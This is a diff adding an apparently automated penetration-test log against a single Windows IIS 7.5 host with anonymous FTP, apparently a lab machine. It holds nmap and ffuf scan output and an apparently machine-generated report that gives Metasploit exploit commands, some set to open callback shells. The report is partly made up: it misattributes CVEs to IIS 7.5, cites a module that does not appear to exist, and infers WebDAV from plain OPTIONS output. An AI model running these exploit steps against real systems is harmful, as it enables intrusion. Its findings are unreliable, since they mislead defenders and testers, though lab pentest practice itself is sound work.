@@ -1,0 +1,335 @@
+PENTEST LOG — 10.129.10.71
+Date: 2026-06-05T09:32:50.704698
+============================================================
+
+[Step 1] Full TCP SYN scan (all 65535 ports)
+  Cmd: nmap -Pn -sS -p- --min-rate 1000 --max-retries 2 10.129.10.71
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-05 09:33 +0200
+Nmap scan report for 10.129.10.71
+Host is up (0.041s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+21/tcp open  ftp
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 113.05 seconds
+
+----------------------------------------
+[Step 2] Version + OS detection on 21,80
+  Cmd: nmap -Pn -sV -O --version-intensity 5 -sC --script-timeout 60s -p 21,80 -oX /home/marina/Desktop/pentestM/RAG/outputs/nmap_sV_10_129_10_71.xml 10.129.10.71
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-05 09:35 +0200
+Nmap scan report for 10.129.10.71
+Host is up (0.042s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  02:06AM       <DIR>          aspnet_client
+| 03-17-17  05:37PM                  689 iisstart.htm
+|_03-17-17  05:37PM               184946 welcome.png
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp open  http    Microsoft IIS httpd 7.5
+|_http-title: IIS7
+| http-methods: 
+|_  Potentially risky methods: TRACE
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone|specialized
+Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
+Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.92 seconds
+
+----------------------------------------
+[Step 3] Check FTP anonymous login and directory listing
+  Cmd: nmap -Pn -sV --script ftp-anon -p 21 10.129.10.71 --script-timeout 30s
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-05 09:36 +0200
+Nmap scan report for 10.129.10.71
+Host is up (0.042s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  02:06AM       <DIR>          aspnet_client
+| 03-17-17  05:37PM                  689 iisstart.htm
+|_03-17-17  05:37PM               184946 welcome.png
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds
+
+----------------------------------------
+[Step 4] Check for FTP brute force vulnerability
+  Cmd: nmap -Pn -sV --script ftp-brute -p 21 10.129.10.71 --script-timeout 30s
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-05 09:36 +0200
+Nmap scan report for 10.129.10.71
+Host is up (0.042s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.40 seconds
+
+----------------------------------------
+[Step 5] Check for HTTP shellshock vulnerability
+  Cmd: nmap -Pn -sV --script http-shellshock -p 80 10.129.10.71 --script-timeout 30s
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-05 09:37 +0200
+Nmap scan report for 10.129.10.71
+Host is up (0.041s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 7.5
+|_http-server-header: Microsoft-IIS/7.5
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.24 seconds
+
+----------------------------------------
+[Step 6] Check for risky HTTP methods
+  Cmd: nmap -Pn -sV --script http-methods -p 80 10.129.10.71 --script-timeout 30s
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-05 09:38 +0200
+Nmap scan report for 10.129.10.71
+Host is up (0.042s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.23 seconds
+
+----------------------------------------
+[Step 7] Retrieve HTTP page title
+  Cmd: nmap -Pn -sV --script http-title -p 80 10.129.10.71 --script-timeout 30s
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-05 09:39 +0200
+Nmap scan report for 10.129.10.71
+Host is up (0.041s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 7.5
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS7
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.24 seconds
+
+----------------------------------------
+[Step 8] Check for FTP vulnerabilities
+  Cmd: nmap -Pn -sV --script ftp-vsftpd-backdoor -p 21 10.129.10.71 --script-timeout 30s
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-05 09:39 +0200
+Nmap scan report for 10.129.10.71
+Host is up (0.041s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds
+
+----------------------------------------
+[Step 9] Check for HTTP vulnerabilities
+  Cmd: nmap -Pn -sV --script http-enum -p 80 10.129.10.71 --script-timeout 30s
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-05 09:40 +0200
+Nmap scan report for 10.129.10.71
+Host is up (0.041s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 7.5
+|_http-server-header: Microsoft-IIS/7.5
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 61.30 seconds
+
+----------------------------------------
+[Step 10] ACK scan — firewall detection
+  Cmd: nmap -Pn -sA -p 21,80 10.129.10.71
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-05 09:42 +0200
+Nmap scan report for 10.129.10.71
+Host is up.
+
+PORT   STATE    SERVICE
+21/tcp filtered ftp
+80/tcp filtered http
+
+Nmap done: 1 IP address (1 host up) scanned in 3.59 seconds
+
+----------------------------------------
+[Step 11] UDP scan — top 100 ports by frequency
+  Cmd: nmap -Pn -sU --top-ports 100 --open --max-retries 1 10.129.10.71
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-05 09:42 +0200
+Nmap scan report for 10.129.10.71
+Host is up.
+All 100 scanned ports on 10.129.10.71 are in ignored states.
+Not shown: 100 open|filtered udp ports (no-response)
+
+Nmap done: 1 IP address (1 host up) scanned in 21.66 seconds
+
+----------------------------------------
+[Step 12] UDP scan — exploit-focused service ports
+  Cmd: nmap -Pn -sU -p 53,67,69,111,123,137,138,161,162,500,623,1434,1900,4500,5353,11211,17185 --open --max-retries 1 10.129.10.71
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-05 09:42 +0200
+Nmap scan report for 10.129.10.71
+Host is up.
+
+PORT      STATE         SERVICE
+53/udp    open|filtered domain
+67/udp    open|filtered dhcps
+69/udp    open|filtered tftp
+111/udp   open|filtered rpcbind
+123/udp   open|filtered ntp
+137/udp   open|filtered netbios-ns
+138/udp   open|filtered netbios-dgm
+161/udp   open|filtered snmp
+162/udp   open|filtered snmptrap
+500/udp   open|filtered isakmp
+623/udp   open|filtered asf-rmcp
+1434/udp  open|filtered ms-sql-m
+1900/udp  open|filtered upnp
+4500/udp  open|filtered nat-t-ike
+5353/udp  open|filtered zeroconf
+11211/udp open|filtered memcache
+17185/udp open|filtered wdbrpc
+
+Nmap done: 1 IP address (1 host up) scanned in 5.67 seconds
+
+----------------------------------------
+[Step 13] ffuf — http://10.129.10.71
+  Cmd: ffuf -u http://10.129.10.71/FUZZ -w /usr/share/dirb/wordlists/common.txt -t 40 -v -timeout 10 -e php,html,txt,js,json,bak,old,zip -o /tmp/ffuf_output_1780645374.json -of json -fs 1245
+  OK: True
+  Out:
+[200] http://10.129.10.71/
+[301] http://10.129.10.71/aspnet_client
+----------------------------------------
+[Step 14] ffuf — http://10.129.10.71/aspnet_client/
+  Cmd: ffuf -u http://10.129.10.71/aspnet_client/FUZZ -w /usr/share/dirb/wordlists/common.txt -t 40 -v -timeout 10 -e php,html,txt,js,json,bak,old,zip -o /tmp/ffuf_output_1780645419.json -of json -fs 1245
+  OK: True
+  Out:
+[403] http://10.129.10.71/aspnet_client/
+[301] http://10.129.10.71/aspnet_client/system_web
+----------------------------------------
+[Step 15] ffuf vhosts — FUZZ.10.129.10.71
+  Cmd: ffuf -u http://10.129.10.71 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 40 -H 'Host: FUZZ.10.129.10.71' -o /tmp/ffuf_vhost_80_1780645463.json -of json -v -ac
+  OK: True
+  Out:
+
+----------------------------------------
+[Step 17] MSF exploitation phase
+  Cmd: msfconsole (multiple modules)
+  OK: True
+  Out:
+2 modules executed
+----------------------------------------
+[Step 17] Searchsploit + credential phase
+  Cmd: searchsploit / paramiko / ftplib
+  OK: False
+  Out:
+2 exploits tried, 0 shells, 0 creds
+----------------------------------------
+
+============================================================
+EXECUTIVE REPORT:
+## Attack Surface Summary  
+The attack surface is **HIGH** due to the presence of **anonymous FTP access** and **potentially risky HTTP methods**. These conditions allow for unauthenticated access and enumeration of files, increasing the risk of exploitation.  
+
+---
+
+## Detected Services and Versions  
+- **TCP 21**: Microsoft ftpd  
+- **TCP 80**: Microsoft IIS httpd 7.5  
+
+---
+
+## Key Findings  
+- **Anonymous FTP login allowed** on port 21, enabling unauthenticated file enumeration.  
+- **Potentially risky HTTP method 'TRACE'** detected on port 80, which could be exploited for attacks like cross-site tracing.  
+- **Microsoft IIS 7.5** is known to have multiple vulnerabilities if not properly patched.  
+- **WebDAV OPTIONS** on port 80 allows methods such as `OPTIONS`, `TRACE`, `GET`, `HEAD`, and `POST`, increasing the attack surface.  
+- **FTP service** (Microsoft ftpd) may be vulnerable to brute force attacks if not secured.  
+
+---
+
+## Recommended Next Steps  
+1. **Exploit anonymous FTP access** for file enumeration and potential lateral movement.  
+   - Use `Metasploit` module: `auxiliary/scanner/ftp/ftp_login` with anonymous credentials.  
+   - Command:  
+     ```bash
+     msf6 > use auxiliary/scanner/ftp/ftp_login
+     msf6 > set RHOSTS 10.129.10.71
+     msf6 > set USERPASS_FILE /path/to/wordlist.txt
+     msf6 > set USER_ENUM true
+     msf6 > set PASS_ENUM true
+     msf6 > run
+     ```
+
+2. **Test for known IIS 7.5 vulnerabilities**.  
+   - **CVE-2015-1635**: IIS 6.0/7.5 Remote Code Execution (RCE).  
+   - **CVE-2017-7269**: IIS 6.0/7.5 Remote Code Execution (RCE).  
+   - **CVE-2017-7495**: IIS 6.0/7.5 Remote Code Execution (RCE).  
+   - Use `Metasploit` module: `exploit/multi/http/iis_short_file_name` for testing.  
+   - Command:  
+     ```bash
+     msf6 > use exploit/multi/http/iis_short_file_name
+     msf6 > set RHOST 10.129.10.71
+     msf6 > set LHOST <your_ip>
+     msf6 > run
+     ```
+
+3. **Test for TRACE method vulnerability** (cross-site tracing).  
+   - Use `Metasploit` module: `auxiliary/scanner/http/trace` to detect and exploit the TRACE method.  
+   - Command:  
+     ```bash
+     msf6 > use auxiliary/scanner/http/trace
+     msf6 > set RHOSTS 10.129.10.71
+     msf6 > run
+     ```
+
+4. **Verify if WebDAV is enabled** and test for known vulnerabilities.  
+   - Use `Metasploit` module: `exploit/multi/http/webdav_upload_exec` if WebDAV is confirmed.  
+   - Command:  
+     ```bash
+     msf6 > use exploit/multi/http/webdav_upload_exec
+     msf6 > set RHOST 10.129.10.71
+     msf6 > set LHOST <your_ip>
+     msf6 > run
+     ```
+
+5. **Ensure IIS 7.5 is patched** against known vulnerabilities (e.g., CVE-2015-1635, CVE-2017-7269, CVE-2017-7495).  
+   - Apply the latest security updates from Microsoft.
